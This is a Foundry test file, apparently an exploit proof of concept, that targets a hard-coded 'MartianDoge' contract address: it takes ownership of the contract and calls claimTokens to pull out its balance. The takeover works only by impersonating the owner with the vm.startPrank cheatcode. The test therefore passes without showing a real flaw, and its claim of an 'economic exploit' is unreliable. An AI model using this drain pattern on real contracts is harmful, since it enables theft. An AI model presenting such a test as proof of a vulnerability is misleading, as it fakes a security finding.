// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMartianDoge {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function claimTokens() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 100 ether); // Precondition: fund the target contract
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        address originalOwner = IMartianDoge(TARGET).owner();

        // 1. Become the owner
        vm.startPrank(originalOwner);
        IMartianDoge(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        assertEq(IMartianDoge(TARGET).owner(), attacker, "Ownership transfer failed");

        // 2. As the new owner, claim the contract's balance
        IMartianDoge(TARGET).claimTokens();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
